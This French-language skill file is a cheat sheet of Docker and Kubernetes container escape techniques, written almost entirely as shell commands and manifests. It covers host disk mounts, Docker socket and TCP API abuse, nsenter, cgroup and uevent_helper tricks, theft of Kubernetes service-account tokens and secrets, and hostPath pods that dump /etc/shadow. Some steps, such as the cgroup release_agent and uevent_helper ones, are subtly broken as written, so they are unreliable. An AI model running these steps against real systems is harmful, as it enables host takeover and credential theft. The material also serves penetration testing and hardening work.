---
name: container-escape-techniques
description: Guide complet d'évasion de conteneurs Docker/Kubernetes — échappement via capabilities, mounts, cgroups, nsenter, k8s RBAC, service accounts, pods, et nodes
category: cybersecurite
---

# Évasion de Conteneurs — Docker & Kubernetes

---

## Prérequis — Énumération dans un conteneur

```bash
# Qui suis-je ?
id
cat /proc/1/cgroup          # Docker ? containerd ? cgroups v1/v2 ?
cat /proc/1/environ
cat /proc/self/mountinfo    # Points de montage

# Capabilities
capsh --print
cat /proc/1/status | grep Cap
# Décoder les capabilities
capsh --decode=00000000a80425fb

# Namespaces
ls -la /proc/1/ns/
# Si tous les namespaces sont identiques au host → non conteneurisé

# Seccomp
cat /proc/1/status | grep Seccomp
# 0 = disabled, 1 = strict, 2 = filter

# AppArmor
cat /proc/1/attr/current

# Disque
df -h
mount
ls -la /dev/
```

---

## Technique 1: Privileged Container

```bash
# Si le conteneur tourne avec --privileged
# = TOUTES les capabilities, accès complet aux devices

# Vérifier
cat /proc/1/status | grep CapEff
# Si CapEff = 0000003fffffffff → privileged

# Échappement:
# Monter le système de fichiers du host
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host /bin/bash
# → Vous êtes root sur le host

# Alternative: device /dev/sda*
fdisk -l
mount /dev/sda1 /mnt
```

---

## Technique 2: SYS_ADMIN Capability

```bash
# Vérifier
cat /proc/1/status | grep CapEff
# Decoder: capsh --decode=Caps
# Chercher CAP_SYS_ADMIN

# Échappement via mount --bind
mkdir /tmp/escape
mount --bind /tmp/escape /tmp/escape
# Créer un nouveau namespace de montage
unshare --mount --propagation slave
mount /dev/sda1 /mnt
chroot /mnt /bin/bash
```

---

## Technique 3: SYS_PTRACE + Injection

```bash
# Vérifier CAP_SYS_PTRACE
# Attacher ptrace à un processus du host

# 1. Lister les processus du host
ps aux  # Si le conteneur voit les processus host

# 2. Injecter du code dans un process host
# Exemple: injecter une reverse shell dans un process du host
# Nécessite un injecteur (ptrace-payload)
```

---

## Technique 4: Mount du Socket Docker

```bash
# Vérifier
ls -la /var/run/docker.sock
ls -la /run/docker.sock

# Si présent → contrôle total du daemon Docker
# Lancer un conteneur privilégié sur le host

docker run -it --privileged --pid=host -v /:/host ubuntu /bin/bash
# → chroot /host

# Alternative: API Docker
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock http://localhost/containers/create -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
```

---

## Technique 5: cgroup Escape

```bash
# Si le conteneur peut monter des cgroups (CAP_SYS_ADMIN + cgroup accessible)

# Vérifier
ls -la /sys/fs/cgroup/
# Si writable → exploitation

# Exploitation via cgroup notify_on_release
mkdir /sys/fs/cgroup/memory/escape
echo 1 > /sys/fs/cgroup/memory/escape/notify_on_release
echo "/bin/sh -c 'cat /etc/shadow > /tmp/shadow'" > /release_agent
# → Déclenché quand les processus du cgroup se terminent
```

---

## Technique 6: nsenter (namespace enter)

```bash
# Si on a CAP_SYS_ADMIN
# Rejoindre le namespace du host

nsenter --target 1 --mount --uts --ipc --pid -- /bin/bash
# → Vous êtes maintenant dans le namespace du host

# Si on ne peut pas nsenter target 1
# Trouver un PID du host
ls /proc/*/root/  # Montre les root FS des processus
cat /proc/*/cmdline

nsenter --target <PID_HOST> --mount -- /bin/sh
```

---

## Technique 7: Kernel Exploit

```bash
# Exploiter une vulnérabilité du noyau depuis le conteneur
# Les plus connues:

# CVE-2022-0847 (Dirty Pipe) — Linux 5.8+
# CVE-2021-22555 — Netfilter memory corruption
# CVE-2022-0185 — File system mount escape
# CVE-2024-1086 — Netfilter UAF
# CVE-2023-2640 — Ubuntu OverlayFS

# Outils
# linux-exploit-suggester
./linux-exploit-suggester.sh
# deepce (Docker Escape Check)
./deepce.sh
```

---

## Technique 8: Kubernetes Service Account

```bash
# Vérifier le service account
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Tester l'accès à l'API K8s
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"

# Lister les pods
curl -k $APISERVER/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN"

# Lister les secrets
curl -k $APISERVER/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $TOKEN"

# Vérifier les permissions RBAC
curl -k $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"spec":{"namespace":"default"}}'
```

### K8s Escape via HostPath

```yaml
# Si on peut créer des pods (RBAC permissif)
# Pod avec HostPath pour accéder au FS du node
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: ubuntu
    command: ["/bin/sh"]
    args: ["-c", "cat /host/etc/shadow; sleep 3600"]
    volumeMounts:
    - name: hostfs
      mountPath: /host
  volumes:
  - name: hostfs
    hostPath:
      path: /
```

---

## Technique 9: Docker.sock proxy

```bash
# Si le daemon Docker écoute sur TCP (pas seulement socket)
curl http://<HOST_IP>:2375/containers/json
curl http://<HOST_IP>:2376/containers/json  # TLS

# Docker API over TCP
# Créer un conteneur privilégié
curl -X POST http://<HOST_IP>:2375/containers/create \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
```

---

## Technique 10: Writable /sys

```bash
# Vérifier
ls -la /sys/kernel/uevent_helper

# Si writable → écrire un script
echo "#!/bin/bash" > /host_escape.sh
echo "cat /etc/shadow > /tmp/shadow" >> /host_escape.sh
chmod +x /host_escape.sh

# Modifier uevent_helper
echo "/host_escape.sh" > /sys/kernel/uevent_helper

# Déclencher un uevent
echo change > /sys/class/.../uevent
```

---

## Outils automatisés

```bash
# deepce — Docker Escape Check
git clone https://github.com/stealthcopter/deepce
cd deepce
./deepce.sh

# CDK — Container Defense Kit
git clone https://github.com/cdk-team/CDK
./cdk evaluate

# amicontained — détection de conteneurisation
amicontained

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# kube-hunter — scan K8s
kube-hunter --remote target.com
kube-hunter --cidr 10.0.0.0/24

# Peirates — K8s pentest
git clone https://github.com/inguardians/peirates
./peirates
```

---

## Checklist

```
ÉNUMÉRATION
☐ id, cat /proc/1/cgroup, mountinfo
☐ capabilities (capsh --print)
☐ Namespaces identiques au host ?
☐ Socket Docker monté ?
☐ Service account K8s présent ?
☐ Cgroups writable ?
☐ /sys/ accessible ?
☐ /dev/ devices bruts ?
☐ Process du host visibles ?

EXPLOITATION
☐ --privileged → mount /dev/sda1
☐ CAP_SYS_ADMIN → nsenter ou mount --bind
☐ CAP_SYS_PTRACE → ptrace injection
☐ /var/run/docker.sock → docker run privilégié
☐ cgroup notify_on_release
☐ nsenter --target 1 --mount
☐ Kernel exploit (dirty pipe, etc.)
☐ K8s RBAC → pods, secrets, hostPath
☐ API Docker TCP → 2375/2376
```

## Ressources

- **HackTricks** : https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html
- **deepce** : https://github.com/stealthcopter/deepce
- **CDK** : https://github.com/cdk-team/CDK
- **Peirates** : https://github.com/inguardians/peirates
- **kube-hunter** : https://github.com/aquasecurity/kube-hunter
- **Container Escape CVEs** : https://www.cvedetails.com/vulnerability-list/vendor_id-13572/Docker.html